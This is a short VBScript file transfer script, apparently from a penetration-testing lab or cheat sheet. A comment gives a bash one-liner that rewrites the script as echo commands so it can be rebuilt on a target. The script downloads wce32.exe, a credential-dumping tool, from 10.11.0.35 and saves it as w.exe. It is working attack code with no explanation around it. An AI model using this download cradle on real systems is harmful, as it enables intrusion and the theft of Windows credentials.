' cat http_download.vbs | while read line; do echo "echo $line>> dl.vbs"; done
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://10.11.0.35/wce32.exe", False
xHttp.Send
with bStrm
.type = 1 '//binary
.open
.write xHttp.responseBody
.savetofile "w.exe", 2 '//overwrite
end with
